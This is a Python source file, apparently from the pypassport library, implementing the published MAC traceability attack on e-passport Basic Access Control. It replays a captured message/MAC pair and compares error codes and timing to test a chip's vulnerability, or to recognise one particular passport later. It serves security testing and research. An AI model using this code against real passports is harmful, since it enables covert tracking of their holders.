from __future__ import annotations

import logging
import os
import time

from pypassport.doc9303.bac import BAC
from pypassport.doc9303.mrz import MRZ
from pypassport.hex_utils import bin_to_hex_rep
from pypassport.iso7816 import ISO7816, APDUCommand, APDUResponse, ISO7816Exception


class MacTraceabilityException(Exception):
    pass


class MacTraceability:
    """
    MAC traceability attack (Chothia & Smirnov, University of Birmingham).

    A passport can be recognised from a single message/MAC pair captured during
    a legitimate BAC. Replaying that pair makes a vulnerable chip behave
    differently (different error or a measurable timing gap) than it does for a
    random pair, because it checks the MAC before the message. The two main
    methods are:
        - L{is_vulnerable}: check whether a passport is vulnerable.
        - L{save_pair} / L{check_from_file}: capture a pair from one passport and
          later test whether a passport on the reader is that same passport.

    Note: some passports (e.g. French) add an incremented delay after each
    failed BAC as an anti-brute-force measure, which can cause false positives.
    A legitimate BAC is therefore established between probes to reset that delay.
    """

    def __init__(self, iso7816, mrz=None):
        self._iso7816 = iso7816

        if not isinstance(self._iso7816, ISO7816):
            raise MacTraceabilityException("The sublayer iso7816 is not available")

        self._mrz: MRZ | None = None
        if mrz is not None:
            self.set_mrz(mrz)

        self._iso7816.rst_connection()
        self._bac = BAC(iso7816)

    def set_mrz(self, mrz):
        """Set (and validate) the MRZ used for the legitimate BAC.

        @param mrz: The MRZ, as a string, bytes or MRZ object.
        @return: True if the MRZ is valid, False otherwise.
        """
        if isinstance(mrz, MRZ):
            self._mrz = mrz
        elif isinstance(mrz, (str, bytes)):
            self._mrz = MRZ(mrz.decode() if isinstance(mrz, bytes) else mrz)
        else:
            raise MacTraceabilityException("Invalid MRZ: expected a string, bytes or MRZ object")
        return bool(self._mrz.check_mrz())

    def is_vulnerable(self, CO=1.7):
        """Check whether the passport is vulnerable.

            - Establish a legitimate BAC and capture a valid message/MAC pair.
            - Reset, send a random pair (wrong MAC), record answer and timing.
            - Reset, replay the captured pair (correct MAC, wrong message),
              record answer and timing.

        If the two answers differ, the passport is distinguishable and therefore
        vulnerable. Otherwise the response-time gap is compared against the
        cut-off C{CO}: a gap wider than the cut-off also indicates vulnerability.

        The default 1.7 ms cut-off is the value Chothia & Smirnov found to work
        across every country they tested with low false-positive/negative rates.

        @param CO: Response-time cut-off in milliseconds.
        @type CO: float
        @return: A tuple (vulnerable: bool, comment: str).
        """
        self._require_mrz()

        cmd_data = self._get_pair()
        self.rst_bac()
        (ans1, res_time1) = self._send_pair()
        self.rst_bac()
        (ans2, res_time2) = self._send_pair(cmd_data)

        gap_ms = (res_time2 - res_time1) * 1000
        comment = ("Cut-off: {:.3f}ms - Wrong MAC: SW1:{:02X} SW2:{:02X} - Correct MAC: SW1:{:02X} SW2:{:02X}").format(
            gap_ms, ans1.sw1, ans1.sw2, ans2.sw1, ans2.sw2
        )

        if ans1.data != ans2.data or ans1.sw1 != ans2.sw1 or ans1.sw2 != ans2.sw2:
            logging.info("Vulnerable: the wrong-MAC and correct-MAC answers differ")
            vulnerable = True
        elif gap_ms > CO:
            logging.info(
                "Possibly vulnerable: response-time gap (%.3fms) exceeds the "
                "cut-off; verify consistency and fine-tune the threshold",
                gap_ms,
            )
            vulnerable = True
        else:
            logging.info("Does not seem to be vulnerable (gap %.3fms)", gap_ms)
            vulnerable = False

        logging.info("Answer with wrong MAC: SW1:%02X SW2:%02X (%.4fs)", ans1.sw1, ans1.sw2, res_time1)
        logging.info("Answer with correct MAC: SW1:%02X SW2:%02X (%.4fs)", ans2.sw1, ans2.sw2, res_time2)

        return (vulnerable, comment)

    def save_pair(self, path=".", filename="pair"):
        """Capture a valid message/MAC pair and store it in a file.

        The pair can be used later (see L{check_from_file}) to test whether a
        passport on the reader is the one that produced the pair. Missing folders
        are created; if the file exists, a number is appended to the name.

        @param path: Destination directory (relative or absolute).
        @param filename: File name for the saved pair.
        @return: The full path of the saved file.
        """
        self._require_mrz()
        if not os.path.exists(path):
            os.makedirs(path)
        fullpath = os.path.join(path, filename)
        if os.path.exists(fullpath):
            i = 0
            while os.path.exists(os.path.join(path, filename + str(i))):
                i += 1
            fullpath = os.path.join(path, filename + str(i))

        cmd_data = self._get_pair()
        with open(fullpath, "wb") as pair:
            pair.write(cmd_data)
        return fullpath

    def check_from_file(self, path=os.path.join(".", "pair"), CO=1.7):
        """Test whether the passport on the reader produced a saved pair.

        @param path: Path to a pair saved by L{save_pair}.
        @param CO: Response-time cut-off in milliseconds.
        @return: True if the passport seems to be the one that created the pair.
        """
        if not os.path.exists(path):
            raise MacTraceabilityException("The pair file does not exist (path={0})".format(path))
        with open(path, "rb") as pair:
            cmd_data = pair.read()

        (ans1, res_time1) = self._send_pair()
        (ans2, res_time2) = self._send_pair(cmd_data)

        if ans1.data != ans2.data or ans1.sw1 != ans2.sw1 or ans1.sw2 != ans2.sw2:
            return True
        return (res_time2 - res_time1) * 1000 > CO

    def reach_max_delay(self, nb=13):
        """Send C{nb} wrong pairs to reach the longest anti-brute-force delay.

        Useful only against passports that implement the incremented delay.
        """
        for _ in range(nb):
            self._send_pair()

    def rst_bac(self):
        """Establish a legitimate BAC then reset the connection.

        This resets the anti-brute-force delay (e.g. on French passports).
        """
        mrz = self._require_mrz()
        logging.debug("Establish a valid BAC to reset the anti-brute-force delay")
        self._iso7816.rst_connection()
        self._bac.authentication_and_establishment_of_session_keys(mrz)
        self._iso7816.rst_connection()

    def _require_mrz(self) -> MRZ:
        if self._mrz is None:
            raise MacTraceabilityException("No MRZ set; call set_mrz() first")
        return self._mrz

    def _get_pair(self):
        """Capture a message with a valid MAC (derived from the MRZ's Kmac).

        @return: A valid binary message/MAC APDU payload.
        """
        mrz = self._require_mrz()
        logging.debug("Capturing a message with a valid MAC (MRZ: %s)", mrz.get_mrz())
        self._bac.derivation_of_document_basic_access_keys(mrz)
        rnd_icc = self._iso7816.get_challenge()
        cmd_data = self._bac.authentication(rnd_icc)
        logging.debug("Valid pair: %s", bin_to_hex_rep(cmd_data))
        self._iso7816.rst_connection()
        return cmd_data

    def _send_pair(self, cmd_data=None):
        """Send a message/MAC pair and time the response.

        With no argument a random pair is sent so the MAC check fails. With a
        captured pair, a wrong message is sent with a valid MAC so the MAC check
        passes but the message is rejected.

        @param cmd_data: The pair to send (binary), or None for a random pair.
        @return: A tuple (APDUResponse, response_time_seconds).
        """
        self._iso7816.get_challenge()

        if cmd_data is None:
            logging.debug("Sending a message with a wrong MAC")
            logMsg = "Wrong MAC"
            data = bin_to_hex_rep(b"\x55" * 40)
        else:
            logging.debug("Sending a message with a correct MAC")
            logMsg = "Correct MAC"
            data = bin_to_hex_rep(cmd_data)

        # mutual_authentication() executes the APDU immediately, which is not
        # suitable here because the response timing and status word are the
        # evidence under test. Build the command explicitly and request the
        # complete APDUResponse from transmit().
        toSend = APDUCommand("00", "82", "00", "00", data=data, le="28")
        starttime = time.time()
        try:
            response = self._iso7816.transmit(toSend, logMsg, full=True)
        except ISO7816Exception as msg:
            response = APDUResponse(b"", msg.sw1 or 0, msg.sw2 or 0)
        timetaken = time.time() - starttime
        logging.debug("Response time: %ss", timetaken)
        self._iso7816.rst_connection()
        return (response, timetaken)
